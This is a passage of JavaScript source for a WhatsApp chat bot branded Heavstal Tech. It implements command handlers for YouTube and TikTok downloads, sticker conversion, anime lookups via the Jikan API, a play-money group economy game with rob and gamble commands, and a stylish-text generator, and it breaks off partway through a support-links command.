case 'ytmp4': case 'ytvideo': case 'ytplayvideo': {
  if (!text) return Vreply(`📌 *Example:* ${prefix + command} youtube_url`);
  if (!text.includes('youtu')) return Vreply('❌ *The URL does not contain results from YouTube!*');
  
  try {
      const hasil = await ytMp4(text);
     Vreply(mess.wait)
      const views = hasil.views ? hasil.views.toLocaleString() : "0";
      const likes = hasil.likes ? hasil.likes.toLocaleString() : "0";
      const dislikes = hasil.dislike ? hasil.dislike.toLocaleString() : "0";

      await HeavstalTech.sendMessage(m.chat, {
          video: { url: hasil.result },
          caption: `🎥 *Title:* ${hasil.title}\n` +
                   `📜 *Description:* ${hasil.desc || 'No description'}\n` +
                   `📺 *Channel:* ${hasil.channel}\n` +
                   `👁️ *Views:* ${views}\n` +
                   `👍 *Likes:* ${likes}\n` +
                   `👎 *Dislikes:* ${dislikes}\n` +
                   `📆 *Uploaded On:* ${hasil.uploadDate}\n\n` +
                   `${footer}`
      }, { quoted: m });
  } catch (err) {
      console.error('❌ Error downloading video:', err);
      Vreply(`${mess.error.feature}\n_Details:_${err}`);
  }
}
break;   
//=================================================//  


//=================================================//
case 'ytadoc':
case 'ytmp3doc': {
    try {
        const source = text || m.quoted?.text;
        if (!source) {
            return Vreply(`*${MenuStyle} Please provide a YouTube link or a song title.*\n_You can also reply to a message containing a link._\n\n${footer}`);
        }

        await Vreply(mess.wait);
        const ytRegex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.be)\/.+/;
        const urlsInText = extractUrlsFromString(source);
        let link = urlsInText.find(url => ytRegex.test(url));
        if (!link) {
            const searchResult = await ytSearch(source);
            if (searchResult) {
                link = searchResult.url;
            } else {
                return Vreply(`*${MenuStyle} No results found for your query: "${source}".*\n\n${footer}`);
            }
        }
        
        if (!link || !ytRegex.test(link)) {
             return Vreply(`*${MenuStyle} Invalid input. Could not find a valid YouTube link or search result.*\n\n${footer}`);
        }

        const audioData = await ytMp3(link);
        if (!audioData || !audioData.result) {
            return Vreply(`*${MenuStyle} Could not process the audio for download.*\nPlease try a different song or link.\n\n${footer}`);
        }
        
        const audioBuffer = await getBuffer(audioData.result);
        const caption = `*${MenuStyle} Title:* ${audioData.title}\n\n${global.CAPTION}\n\n${footer}`;
        await HeavstalTech.sendMessage(m.chat, {
            document: audioBuffer,
            mimetype: 'audio/mpeg',
            fileName: `${audioData.title}.mp3`,
            caption: caption
        }, { quoted: m });
    } catch (e) {
        console.error("YTAdoc command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'tik-img':
case 'tt-img': 
case 'ttimg': {
    try {
        const source = text || m.quoted?.text;
        if (!source) {
            return Vreply(`*${MenuStyle} Please provide a TikTok link to download images from.*\n_You can also reply to a message containing a link._\n\n${footer}`);
        }

        const ttRegex = /https:\/\/(?:www\.|vm\.|m\.|vt\.)?tiktok\.com\/.+/;
        const urlsInText = extractUrlsFromString(source);
        const link = urlsInText.find(url => ttRegex.test(url));

        if (!link) {
            return Vreply(`*${MenuStyle} No valid TikTok URL found in the provided text.*\nPlease make sure it's a full TikTok link.\n\n${footer}`);
        }
        
        await Vreply(mess.wait);
        const apiUrl = `https://api.kord.live/api/tik-img?url=${encodeURIComponent(link)}`;
        const response = await fetch(apiUrl);
        const data = await response.json();

        if (!data || !data.downloadableImages || data.downloadableImages.length === 0) {
            return Vreply(`*${MenuStyle} No images found at that link.*\nThis command is for TikTok photo slideshows, not videos.\n\n${footer}`);
        }

        await Vreply(`*${MenuStyle} Found ${data.downloadableImages.length} images. Sending them now...*`);
        for (const imageUrl of data.downloadableImages) {
            try {
                await HeavstalTech.sendMessage(m.chat, {
                    image: { url: imageUrl },
                    caption: `${global.CAPTION}\n\n${footer}`
                }, { quoted: m });
            } catch (imgError) {
                console.error(`TikTok image download error: ${imgError.message}`);
            }
        }
        
        return await HeavstalTech.sendMessage(m.chat, {react: {text: "✅", key: m.key}});

    } catch (e) {
        console.error("TikTok Image command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: Could not connect to the TikTok download service._`);
    }
}
break;
//=================================================//


//=================================================//
case 'togif': {
    try {
        
        if (!m.quoted || !m.quoted.sticker) {
            return Vreply(`*${MenuStyle} Please reply to a sticker to convert it to a GIF.*\n\n${footer}`);
        }
        
        if (!m.quoted.isAnimated) {
            return Vreply(`*${MenuStyle} This command only works on animated stickers.*\nPlease reply to an animated (video) sticker.\n\n${footer}`);
        }

        Vreply(mess.wait)
           await loading();


        if (typeof webp2mp4 !== 'function') {
            return Vreply(`*${MenuStyle} Feature Incomplete.*\nThe 'webp2mp4' helper function is not defined. Please contact the developer.\n\n${footer}`);
        }

        // Download the sticker data into a buffer.
        const stickerBuffer = await HeavstalTech.downloadMediaMessage(m.quoted);

        // Convert the webp buffer to an mp4 buffer.
        const videoBuffer = await webp2mp4(stickerBuffer);

        if (!videoBuffer) {
             return Vreply(`*${MenuStyle} Conversion Failed.*\nCould not convert the sticker to a GIF.\n\n${footer}`);
        }

        // Send the resulting buffer as a video with the 'gifPlayback' flag.
        await HeavstalTech.sendMessage(m.chat, {
            video: videoBuffer,
            gifPlayback: true, // This makes it loop like a GIF
            caption: `${global.CAPTION}\n\n${footer}`
        }, { quoted: m });

    } catch (e) {
        console.error("Togif command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


case 'todoc':
case 'todocument': {
    try {
        
        const quotedMessage = m.quoted;
        if (!quotedMessage || !(quotedMessage.image || quotedMessage.video || quotedMessage.audio)) {
            return Vreply(`*${MenuStyle} Please reply to an image, video, or audio message to convert it to a document.*\n\n${footer}`);
        }

        Vreply(mess.wait)
             await loading();
             
        const fileName = (text ? text.replace(/[^A-Za-z0-9-_\s]/g, '') : rand(10)).trim();
        const mediaBuffer = await HeavstalTech.downloadMediaMessage(quotedMessage);

        if (!mediaBuffer) {
            return Vreply(`*${MenuStyle} Failed to download the media. Please try again.*\n\n${footer}`);
        }
        
        const fileInfo = await fromBuffer(mediaBuffer);
        if (!fileInfo) {
            return Vreply(`*${MenuStyle} Could not determine the file type of the media.*\n\n${footer}`);
        }
        
        const { ext, mime } = fileInfo;
        const finalFileName = `${fileName}.${ext}`;

        await HeavstalTech.sendMessage(m.chat, {
            document: mediaBuffer,
            mimetype: mime,
            fileName: finalFileName,
            caption: `${global.CAPTION}\n\n${footer}`
        }, { quoted: m });

    } catch (e) {
        console.error("Todoc command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'animenews': {
    try {
        Vreply(mess.wait);
        await loading();
        const response = await fetch("https://api.jikan.moe/v4/top/anime?filter=airing&limit=5");
        const json = await response.json();
        const animeList = json.data;

        if (!animeList || animeList.length === 0) {
            return Vreply(`*${MenuStyle} Could not fetch trending anime news at this time.*\n\n${footer}`);
        }

        let replyText = `*${MenuStyle} TOP 5 TRENDING ANIME RIGHT NOW ${MenuStyle}*\n\n`;
        animeList.forEach(anime => {
            replyText += `*${MenuStyle} Title:* ${anime.title}\n` +
                         `*${MenuStyle} Score:* ${anime.score} ⭐\n` +
                         `*${MenuStyle} Episodes:* ${anime.episodes || 'Airing'}\n` +
                         `*${MenuStyle} More Info:* ${anime.url}\n\n`;
        });
        replyText += `${footer}`;

        await HeavstalTech.sendMessage(m.chat, { react: { text: "📰", key: m.key } });
        return Vreply(replyText);
    } catch (e) {
        console.error(e);
        Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'character':
case 'animechar': {
    try {
        if (!text) {
            return Vreply(`*${MenuStyle} Please provide a character's name to search for.*\n_Example: ${prefix}character Naruto Uzumaki_\n\n${footer}`);
        }

        Vreply(mess.wait)
await loading();

        // --- Command Logic ---
        const apiUrl = `https://api.jikan.moe/v4/characters?q=${encodeURIComponent(text)}&limit=1`;
        const response = await axios.get(apiUrl);
        const characterData = response.data.data;

        if (!characterData || characterData.length === 0) {
            return Vreply(`*${MenuStyle} No character found with the name "${text}".*\nPlease check the spelling.\n\n${footer}`);
        }

        const char = characterData[0];
        
        // Truncate the 'about' section if it's too long to avoid hitting message limits.
        const aboutText = char.about ? (char.about.length > 500 ? char.about.substring(0, 500) + '...' : char.about) : "No information available.";

        let caption = `*${MenuStyle} Name:* ${char.name}\n`;
        if (char.name_kanji) caption += `*${MenuStyle} Kanji:* ${char.name_kanji}\n`;
        if (char.nicknames && char.nicknames.length > 0) {
            caption += `*${MenuStyle} Nicknames:* ${char.nicknames.join(", ")}\n`;
        }
        caption += `\n*${MenuStyle} About:*\n${aboutText}\n\n` +
                   `*${MenuStyle} Favorites:* ${char.favorites.toLocaleString()} users\n`+
                   `*${MenuStyle} More Info:* ${char.url}\n\n` +
                   `${footer}`;

        await HeavstalTech.sendMessage(m.chat, {
            image: { url: char.images.jpg.image_url },
            caption: caption
        }, { quoted: m });
        
        await HeavstalTech.sendMessage(m.chat, {react: {text: "🥷", key: m.key}});

    } catch (e) {
        console.error("Character command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: The Anime API is currently unavailable._`);
    }
}
break;
//=================================================//


//=================================================//
case 'animerec':
case 'recommend': {
    try {
       Vreply(mess.wait)
await loading();
        let apiUrl = "https://api.jikan.moe/v4/recommendations/anime";
        let headerText = `*${MenuStyle} GENERAL ANIME RECOMMENDATIONS ${MenuStyle}*\n\n`;
        let isSpecificSearch = false;

        // --- Logic for Specific Recommendations ---
        if (text) {
            // First, search for the anime to get its ID.
            const searchResponse = await axios.get(`https://api.jikan.moe/v4/anime?q=${encodeURIComponent(text)}&limit=1`);
            const searchData = searchResponse.data.data;

            if (searchData && searchData.length > 0) {
                const animeId = searchData[0].mal_id;
                const animeTitle = searchData[0].title;
                apiUrl = `https://api.jikan.moe/v4/anime/${animeId}/recommendations`;
                headerText = `*${MenuStyle} BECAUSE YOU LIKE ${animeTitle.toUpperCase()} ${MenuStyle}*\n\n`;
                isSpecificSearch = true;
            }
        }

        // --- Fetching and Formatting Recommendations ---
        const recResponse = await axios.get(apiUrl);
        const recommendations = recResponse.data.data;
        const limit = 5;

        if (!recommendations || recommendations.length === 0) {
            return Vreply(`*${MenuStyle} No recommendations found.${isSpecificSearch ? ` for "${text}"` : "" }*\n\n${footer}`);
        }

        let replyText = headerText;

        recommendations.slice(0, limit).forEach((rec, index) => {
            // The API response structure is different for general vs. specific recommendations.
            const entry = isSpecificSearch ? rec.entry : rec.entry[0];
            replyText += `*${index + 1}.* ${entry.title}\n`;
            if (isSpecificSearch) {
                replyText += `   *Votes:* ${rec.votes}\n\n`;
            } else {
                replyText += `   *Info:* ${entry.url}\n\n`;
            }
        });

        replyText += `${footer}`;

        await HeavstalTech.sendMessage(m.chat, {react: {text: "🎯", key: m.key}});
        return Vreply(replyText);

    } catch (e) {
        console.error("Anime Recommendation command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: The Anime API is currently unavailable._`);
    }
}
break;
//=================================================//


//=================================================//
case 'economy':
case 'econ': {
    try {
        if (!m.isGroup) return Vreply(mess.only.group);
        if (!isAdmin && !isCreator) return Vreply(mess.only.admin); // Now admins can toggle it too

        if (!global.MONGODB_URI) {
            const guideMessage = `*${MenuStyle} 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘 𝗡𝗢𝗧 𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗*

*Action Required:* To use the economy commands, you must set up a MongoDB database.

*sᴛᴇᴘs:*
1. Go to https://mongodb.com/cloud/atlas/register to create a free database.
2. After setup, get your connection string (URI).
3. In your bot's settings *(Config.js)*, set the \`MONGODB_URI\` link to your connection string.

_Example:_
\`\`\`MONGODB_URI = "mongodb+srv://user:pass@cluster.mongodb.net/dbname"\`\`\`

Once the URI is set, restart the bot to enable economy features (optional).

${footer}`;
            return Vreply(guideMessage);
        }

        // Initialize chat object if it doesn't exist yet
        if (!global.db.data.chats[m.chat]) {
            global.db.data.chats[m.chat] = {};
        }

        const option = text.toLowerCase().trim();
        const isEnabled = global.db.data.chats[m.chat].economy || false;

        if (option === 'on') {
            if (isEnabled) {
                return Vreply(`*${MenuStyle} Economy is already ON in this group.*\n\n${footer}`);
            }
            global.db.data.chats[m.chat].economy = true;
            await global.db.write(); // Save to LowDB
            return Vreply(`*${MenuStyle} Economy system has been ACTIVATED for this group.*\n\n${footer}`);

        } else if (option === 'off') {
            if (!isEnabled) {
                return Vreply(`*${MenuStyle} Economy is already OFF in this group.*\n\n${footer}`);
            }
            global.db.data.chats[m.chat].economy = false;
            await global.db.write(); // Save to LowDB
            return Vreply(`*${MenuStyle} Economy system has been DEACTIVATED for this group.*\n\n${footer}`);

        } else {
            return Vreply(`*${MenuStyle} Economy Manager*

*Status:* ${isEnabled ? 'Active' : 'Inactive'}

Use one of the following commands:
*${MenuStyle} ${prefix}economy on*
*${MenuStyle} ${prefix}economy off*

${footer}`);
        }
    } catch (e) {
        console.error("Economy command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//
		

//=================================================//
case 'bal':
case 'wallet': {
    try {
        if (!m.isGroup || !global.db.data.chats[m.chat]?.economy) {
    return Vreply(`*${MenuStyle} The economy system is not active in this group.*\nAn admin can enable it with: ${prefix}economy on\n\n${footer}`);
}

        const target = m.mentionedJid?.[0] || m.quoted?.sender || m.sender;
        const b = await edb.balance(target);
        
        const targetName = `@${target.split("@")[0]}`;

        const replyText = `\`\`\`╔════════════════╗
╠   💰 USER BALANCE  ╣
╠════════════════╝
╠ 👤 User: ${targetName}
╠
╠ 💎 Wallet: ₹${b.wallet.toLocaleString()}
╠ 🏦 Bank:   ₹${b.bank.toLocaleString()} / ₹${b.bankCapacity.toLocaleString()}
╚════════════════\`\`\``;

        // The original code used a custom 'ad' message type. 
        // This is a standard text reply with mentions.
        return Vreply(replyText, { mentions: [target] });

    } catch (e) {
        console.error("Balance command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'daily': {
    try {
        if (!m.isGroup || !global.db.data.chats[m.chat]?.economy) {
    return Vreply(`*${MenuStyle} The economy system is not active in this group.*\nAn admin can enable it with: ${prefix}economy on\n\n${footer}`);
}
        const dailyResult = await edb.daily(m.sender);

        if (dailyResult.cd) {
            // User is on cooldown
            const replyText = `*${MenuStyle} You've Already Claimed Today*

Please wait *${dailyResult.cdL}* before claiming again.`;
            // NOTE: The 'ad' message type with thumbnail is not standard.
            // This will be converted to a standard text reply.
            return Vreply(replyText);
        } else {
            // User successfully claimed the reward
            const newBalance = await edb.balance(m.sender);
            const replyText = `*${MenuStyle} Daily Reward Claimed!* 🎉

*${MenuStyle} Amount:* ₹${dailyResult.amount.toLocaleString()}
*${MenuStyle} New Wallet Balance:* ₹${newBalance.wallet.toLocaleString()}

_You can claim again in 24 hours._\n\n${footer}`;
            return Vreply(replyText);
        }
    } catch (e) {
        console.error("Daily command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//



//=================================================//
case 'dep':
case 'deposit': {
    try {
        if (!m.isGroup || !global.db.data.chats[m.chat]?.economy) {
    return Vreply(`*${MenuStyle} The economy system is not active in this group.*\nAn admin can enable it with: ${prefix}economy on\n\n${footer}`);
}

        // --- Input Validation ---
        const amountArg = text.trim();
        if (!amountArg) {
            return Vreply(`*${MenuStyle} Please specify an amount to deposit.*\n_Example: ${prefix}deposit 500_ or _${prefix}deposit all_\n\n${footer}`);
        }

        const amount = amountArg.toLowerCase() === "all" ? "all" : parseInt(amountArg);
        
        if (amount !== 'all' && (isNaN(amount) || amount <= 0)) {
            return Vreply(`*${MenuStyle} Invalid Amount.*\nPlease enter a valid number greater than zero.\n\n${footer}`);
        }

        // --- Command Logic ---
        const depositResult = await edb.deposit(m.sender, amount);

        if (depositResult.invalid) {
            return Vreply(`*${MenuStyle} Invalid Amount.*\nPlease enter a valid number greater than zero.\n\n${footer}`);
        }
        if (depositResult.noten) {
            const currentBalance = await edb.balance(m.sender);
            return Vreply(`*${MenuStyle} Deposit Failed.*\nYour bank is full or you do not have enough money in your wallet.\n\n*Wallet:* ₹${currentBalance.wallet.toLocaleString()}\n*Bank:* ₹${currentBalance.bank.toLocaleString()} / ₹${currentBalance.bankCapacity.toLocaleString()}\n\n${footer}`);
        }

        const newBalance = await edb.balance(m.sender);
        const replyText = `*${MenuStyle} Deposit Successful!* 🏦

*${MenuStyle} Amount Deposited:* ₹${depositResult.amount.toLocaleString()}

*New Balances:*
*${MenuStyle} Wallet:* ₹${newBalance.wallet.toLocaleString()}
*${MenuStyle} Bank:* ₹${newBalance.bank.toLocaleString()} / ₹${newBalance.bankCapacity.toLocaleString()}

${footer}`;

        return Vreply(replyText);

    } catch (e) {
        console.error("Deposit command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//



//=================================================//
case 'give':
case 'pay': {
    try {
        
        if (!m.isGroup || !global.db.data.chats[m.chat]?.economy) {
    return Vreply(`*${MenuStyle} The economy system is not active in this group.*\nAn admin can enable it with: ${prefix}economy on\n\n${footer}`);
}

        // --- Input Validation ---
        const target = m.quoted?.sender || m.mentionedJid?.[0] || null;

        if (!target) {
            return Vreply(`*${MenuStyle} Please specify who to pay.*\nReply to a user or mention them with the amount.\n_Example: ${prefix}give @user 500_\n\n${footer}`);
        }
        
        if (target === m.sender) {
            return Vreply(`*${MenuStyle} You cannot give money to yourself.*\n\n${footer}`);
        }

        // Isolate the amount from the text, removing any mentions.
        const amountStr = text.replace(/@\d+/g, '').trim();
        const amount = parseInt(amountStr);

        if (isNaN(amount) || amount <= 0) {
            return Vreply(`*${MenuStyle} Please provide a valid amount to give.*\n_Example: ${prefix}give @user 500_\n\n${footer}`);
        }

        // --- Command Logic ---
        const senderBalance = await edb.balance(m.sender);

        if (senderBalance.wallet < amount) {
            return Vreply(`*${MenuStyle} Insufficient Funds.*\nYou do not have enough money in your wallet to make this payment.\n\n*Your Wallet:* ₹${senderBalance.wallet.toLocaleString()}\n\n${footer}`);
        }

        // Perform the transaction
        await edb.deduct(m.sender, amount);
        await edb.give(target, amount);

        const newSenderBalance = await edb.balance(m.sender);
        
        const replyText = `*${MenuStyle} Payment Successful!* 💸

*${MenuStyle} Amount:* ₹${amount.toLocaleString()}
*${MenuStyle} To:* @${target.split("@")[0]}

*Your New Wallet Balance:* ₹${newSenderBalance.wallet.toLocaleString()}\n\n${footer}`;

        // Send the reply with a mention.
        // Assuming Vreply can handle the 'mentions' option.
        return Vreply(replyText, { mentions: [target] });

    } catch (e) {
        console.error("Give command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'work': {
    try {
        
        if (!m.isGroup || !global.db.data.chats[m.chat]?.economy) {
    return Vreply(`*${MenuStyle} The economy system is not active in this group.*\nAn admin can enable it with: ${prefix}economy on\n\n${footer}`);
}

        // --- Command Logic ---
        const workResult = await edb.work(m.sender);

        if (workResult.cd) {
            // User is on cooldown
            return Vreply(`*${MenuStyle} You're Still Tired from Work 😴*

You need to rest. Please come back in *${workResult.cdL}*.`);
        } else {
            // User successfully worked
            const jobs = ["Backend Developer", "UI/UX Designer", "Community Manager", "Babysitter", "Chef", "Author", "Graphic Artist", "Meme Curator"];
            const job = jobs[Math.floor(Math.random() * jobs.length)];

            const replyText = `*${MenuStyle} Work Complete!* 💼

*${MenuStyle} Job:* ${job}
*${MenuStyle} Earned:* ₹${workResult.amount.toLocaleString()}

_You can work again in 1 hour._\n\n${footer}`;
            return Vreply(replyText);
        }
    } catch (e) {
        console.error("Work command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'rob': {
    try {        
        if (!m.isGroup || !global.db.data.chats[m.chat]?.economy) {
    return Vreply(`*${MenuStyle} The economy system is not active in this group.*\nAn admin can enable it with: ${prefix}economy on\n\n${footer}`);
}

        // --- Input Validation ---
        const target = m.quoted?.sender || m.mentionedJid?.[0] || null;

        if (!target) {
            return Vreply(`*${MenuStyle} Who do you want to rob?*\nReply to a user or mention them.\n\n${footer}`);
        }
        
        if (target === m.sender) {
            return Vreply(`*${MenuStyle} You can't rob yourself, silly.*\n\n${footer}`);
        }
        
        if (target === botNumber) {
             return Vreply(`*${MenuStyle} Are you serious? I'll call the cops.*\n\n${footer}`);
        }

        // --- Command Logic ---
        const robResult = await edb.rob(m.sender, target);

        if (robResult.cd) {
            return Vreply(`*${MenuStyle} You need to lay low...*\nThe cops are still looking for you. You can try again in *${robResult.cdL}*.`);
        }

        if (robResult.lowbal) {
            return Vreply(`*${MenuStyle} Not worth it.*\n@${target.split("@")[0]} is too broke to rob.`, { mentions: [target] });
        }

        if (robResult.success) {
            const replyText = `*${MenuStyle} Robbery Successful!* 💰

You sneakily robbed @${target.split("@")[0]} and got away with *₹${robResult.amount.toLocaleString()}!*`;
            return Vreply(replyText, { mentions: [target] });
        } else {
            const replyText = `*${MenuStyle} Robbery Failed!* 👮‍♂️

You were caught trying to rob @${target.split("@")[0]} and had to pay a fine of *₹${robResult.fine.toLocaleString()}*.`;
            return Vreply(replyText, { mentions: [target] });
        }

    } catch (e) {
        console.error("Rob command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'gamble':
case 'bet': {
    try {
        
        if (!m.isGroup || !global.db.data.chats[m.chat]?.economy) {
    return Vreply(`*${MenuStyle} The economy system is not active in this group.*\nAn admin can enable it with: ${prefix}economy on\n\n${footer}`);
}
        // --- Input Validation ---
        const amountArg = text.trim();
        if (!amountArg) {
            return Vreply(`*${MenuStyle} Please specify an amount to gamble.*\n_Example: ${prefix}gamble 100_\n\n${footer}`);
        }

        const amount = parseInt(amountArg);

        if (isNaN(amount) || amount <= 10) { // Set a minimum bet amount
            return Vreply(`*${MenuStyle} Invalid Bet.*\nPlease enter a valid number greater than 10.\n\n${footer}`);
        }

        // --- Command Logic ---
        const userBalance = await edb.balance(m.sender);

        if (userBalance.wallet < amount) {
            return Vreply(`*${MenuStyle} Insufficient Funds.*\nYou don't have enough money in your wallet to place that bet.\n\n*Your Wallet:* ₹${userBalance.wallet.toLocaleString()}\n\n${footer}`);
        }

        const isWin = Math.random() > 0.5; // 50% chance

        if (isWin) {
            // Win: User gets back their bet plus a bonus (10% to 100% of the bet)
            const winMultiplier = Math.random() * 0.9 + 0.1;
            const profit = Math.floor(amount * winMultiplier);
            await edb.give(m.sender, profit);
            const newBalance = await edb.balance(m.sender);

            const replyText = `*${MenuStyle} You Won!* 🎰

*${MenuStyle} Bet Amount:* ₹${amount.toLocaleString()}
*${MenuStyle} Profit:* ₹${profit.toLocaleString()}

*Your new wallet balance is ₹${newBalance.wallet.toLocaleString()}*`;
            return Vreply(replyText);
        } else {
            // Lose: User loses their bet amount
            await edb.deduct(m.sender, amount);
            const newBalance = await edb.balance(m.sender);

            const replyText = `*${MenuStyle} You Lost!* 💸

*${MenuStyle} Bet Amount:* ₹${amount.toLocaleString()}
*${MenuStyle} Lost:* ₹${amount.toLocaleString()}

*Your new wallet balance is ₹${newBalance.wallet.toLocaleString()}*`;
            return Vreply(replyText);
        }

    } catch (e) {
        console.error("Gamble command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'lb':
case 'leaderboard':
case 'top': {
    try {
        
        if (!m.isGroup || !global.db.data.chats[m.chat]?.economy) {
    return Vreply(`*${MenuStyle} The economy system is not active in this group.*\nAn admin can enable it with: ${prefix}economy on\n\n${footer}`);
}

        // --- Input Validation ---
        // Allow user to specify how many top users to show, e.g., 'lb 5'
        const count = parseInt(text) || 10;
        const limit = Math.min(20, Math.max(1, count)); // Clamp the value between 1 and 20

        // --- Command Logic ---
        const leaderboard = await edb.lb(limit);

        if (leaderboard.length === 0) {
            return Vreply(`*${MenuStyle} The leaderboard is empty.*\nBe the first to earn some money!\n\n${footer}`);
        }

        let replyText = `*${MenuStyle} 🏆 TOP ${leaderboard.length} RICHEST USERS 🏆 ${MenuStyle}*\n\n`;
        const mentions = [];

        leaderboard.forEach((user, index) => {
            const rank = index + 1;
            const medal = rank === 1 ? "🥇" : rank === 2 ? "🥈" : rank === 3 ? "🥉" : `${rank}.`;
            const userJid = user.userId;
            
            mentions.push(userJid);
            replyText += `*${medal}* @${userJid.split("@")[0]}\n`;
            replyText += `   *Net Worth:* ₹${user.totalWorth.toLocaleString()}\n\n`;
        });
        
        replyText += `${footer}`;

        return Vreply(replyText, { mentions });

    } catch (e) {
        console.error("Leaderboard command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'shop': {
    try {
        
        if (!m.isGroup || !global.db.data.chats[m.chat]?.economy) {
    return Vreply(`*${MenuStyle} The economy system is not active in this group.*\nAn admin can enable it with: ${prefix}economy on\n\n${footer}`);
}

        // --- Command Logic ---
        const shopItems = await edb.getShop();

        if (!shopItems || shopItems.length === 0) {
            return Vreply(`*${MenuStyle} The shop is currently empty.*\nItems will be restocked soon!\n\n${footer}`);
        }

        let replyText = `*${MenuStyle} 🛒 WELCOME TO THE SHOP 🛒 ${MenuStyle}*\n\n_Use ${prefix}buy <item name or number> to purchase._\n\n`;

        shopItems.forEach((item, index) => {
            replyText += `*${index + 1}. ${item.name}*\n`;
            replyText += `   *Price:* ₹${item.price.toLocaleString()}\n`;
            replyText += `   *Description:* _${item.description}_\n\n`;
        });
        
        replyText += `${footer}`;

        return Vreply(replyText);

    } catch (e) {
        console.error("Shop command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'buy': {
    try {      
        if (!m.isGroup || !global.db.data.chats[m.chat]?.economy) {
    return Vreply(`*${MenuStyle} The economy system is not active in this group.*\nAn admin can enable it with: ${prefix}economy on\n\n${footer}`);
}

        // --- Input Validation ---
        const itemIdentifier = text.trim();
        if (!itemIdentifier) {
            return Vreply(`*${MenuStyle} Please specify which item to buy.*\n_Use the item's number or full name from the shop._\n_Example: ${prefix}buy 1_\n\n${footer}`);
        }

        // --- Command Logic ---
        const buyResult = await edb.buyItem(m.sender, itemIdentifier);

        if (buyResult.notfound) {
            return Vreply(`*${MenuStyle} Item not found.*\nCould not find "${itemIdentifier}" in the shop. Please use the exact name or number.\n\n${footer}`);
        }

        if (buyResult.insufficient) {
            const userBalance = await edb.balance(m.sender);
            return Vreply(`*${MenuStyle} Insufficient Funds.*\nYou need ₹${buyResult.item.price.toLocaleString()} to buy the ${buyResult.item.name}, but you only have ₹${userBalance.wallet.toLocaleString()}.\n\n${footer}`);
        }
        
        const replyText = `*${MenuStyle} Purchase Successful!* 🛒

*${MenuStyle} You bought:* ${buyResult.item.name}
*${MenuStyle} For:* ₹${buyResult.item.price.toLocaleString()}

*Your new wallet balance is ₹${buyResult.newBalance.toLocaleString()}*.\n\n${footer}`;

        return Vreply(replyText);

    } catch (e) {
        console.error("Buy command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'inv':
case 'inventory': {
    try {        
        if (!m.isGroup || !global.db.data.chats[m.chat]?.economy) {
    return Vreply(`*${MenuStyle} The economy system is not active in this group.*\nAn admin can enable it with: ${prefix}economy on\n\n${footer}`);
}
        
        // --- Command Logic ---
        const inventory = await edb.getInventory(m.sender);

        if (inventory.length === 0) {
            return Vreply(`*${MenuStyle} Your Inventory is Empty* 📦\n\nYou don't own any items yet. Visit the *${prefix}shop* to buy some!\n\n${footer}`);
        }

        let replyText = `*${MenuStyle} 🎒 YOUR INVENTORY 🎒 ${MenuStyle}*\n\n`;

        inventory.forEach((item, index) => {
            replyText += `*${index + 1}. ${item.name}*\n`;
            replyText += `   *Quantity:* ${item.quantity.toLocaleString()}\n`;
            replyText += `   *Description:* _${item.description}_\n\n`;
        });
        
        replyText += `${footer}`;

        return Vreply(replyText);

    } catch (e) {
        console.error("Inventory command error:", e);
        return Vreply(`${mess.error.fitur}\n_Details: ${e.message}_`);
    }
}
break;
//=================================================//


//=================================================//
case 'style':
case 'fancy': {
    if (!text) return Vreply(`*Please Provide Text*\n\nExample: ${prefix + command} Heavstal Tech`)
    Vreply(mess.wait)
await loading()
    try {
        const apiKey = HT_API_KEY
        const response = await fetch('https://heavstal-tech.vercel.app/api/v1/style-text', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-api-key': apiKey
            },
            body: JSON.stringify({ text: text.trim() })
        })
        const res = await response.json()
        if (res.status === 'success' && res.data) {
            let replyMsg = `*🎨 Stylish Text Generator*\n\n`
            res.data.forEach((style) => {
                replyMsg += `*${style.name}*\n${style.result}\n\n`
            })
            replyMsg += footer
            await Vreply(replyMsg)
        } else {
            await Vreply(`*Generation Failed*\n\n${res.error || 'Could not generate styles.'}`)
        }
    } catch (e) {
        console.error("Style Command Error:", e)
        Vreply(`*Error:* An unexpected error occurred.`)
    }
}
break;
//=================================================//


//=================================================//                 
case 'social-media': 
case 'support': 
case 'channels': {
	const slides = [
	 [
        'https://heavstal-tech.vercel.app/favicon.ico', // Image URL
        '', // Title
        `Visit Official Website`, // Body Message
        `visit official website to get latest information about Heavstal Tech.`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://heavstal-tech.vercel.app', // Command (URL in this case)
        'cta_url', // Button type
        'https://heavstal-tech.vercel.app/favicon.ico' // URL (used in image generation)
    ], 
    [
